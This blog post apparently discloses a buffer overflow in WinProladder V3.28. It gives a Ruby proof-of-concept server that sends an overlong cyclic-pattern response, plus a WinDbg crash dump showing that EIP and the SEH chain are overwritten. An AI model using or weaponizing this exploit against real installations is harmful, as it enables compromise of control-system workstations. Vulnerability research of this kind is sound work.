---
layout: post
title: WinProladder
date: 2019-10-29
excerpt: "."
tags: [exploit]
comments: false
---
## WinProladder V3.28 Build: 22108
seems that it's still not fixed after a few years. sending this response
while attached to 'WProlad.exe'
```
#!/usr/bin/env ruby
require 'rex'
require 'socket'

buff = Rex::Text.pattern_create(1524)
buff[1032, 4] =[0x41414141].pack('V')
buff[1092, 4] =[0xdeadbeef].pack('V')
buff[1096, 4] =[0xfeedface].pack('V')

server = TCPServer.new 500

loop do
  client = server.accept
  select(nil,nil,nil,0)
  client.write(buff + "\r\n")
end
```
looks like this.
```
(770.bb8): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012f601 ebx=33694232 ecx=0012f098 edx=0012f4ec esi=69423169 edi=0012f59c
eip=41414141 esp=0012f4b4 ebp=0012f4c0 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
0:000> !exchain
0012f4ec: feedface
Invalid exception stack at deadbeef
0:000> kv
ChildEBP RetAddr  Args to Child              
WARNING: Frame IP not in any known module. Following frames may be wrong.
0012f4b0 69423569 37694236 42386942 6a423969 0x41414141
0012f4c0 316a4230 42326a42 6a42336a 356a4234 0x69423569
0012f4c4 42326a42 6a42336a 356a4234 42366a42 0x316a4230
0012f4c8 6a42336a 356a4234 42366a42 6a42376a 0x42326a42
0012f4cc 356a4234 42366a42 6a42376a 396a4238 0x6a42336a
0012f4d0 42366a42 6a42376a 396a4238 42306b42 0x356a4234
0012f4d4 6a42376a 396a4238 42306b42 6b42316b 0x42366a42
0012f4d8 396a4238 42306b42 6b42316b 336b4232 0x6a42376a
0012f4dc 42306b42 6b42316b 336b4232 deadbeef 0x396a4238
0012f4e0 6b42316b 336b4232 deadbeef feedface 0x42306b42
0012f4e4 336b4232 deadbeef feedface 376b4236 0x6b42316b
0012f4e8 deadbeef feedface 376b4236 42386b42 0x336b4232
0012f4ec feedface 376b4236 42386b42 6c42396b 0xdeadbeef
0012f4f0 376b4236 42386b42 6c42396b 316c4230 0xfeedface
0012f4f4 42386b42 6c42396b 316c4230 42326c42 0x376b4236
0012f4f8 6c42396b 316c4230 42326c42 6c42336c 0x42386b42
0012f4fc 316c4230 42326c42 6c42336c 356c4234 0x6c42396b
0012f500 42326c42 6c42336c 356c4234 42366c42 0x316c4230
0012f504 6c42336c 356c4234 42366c42 6c42376c 0x42326c42
0012f508 356c4234 42366c42 6c42376c 396c4238 0x6c42336c
```
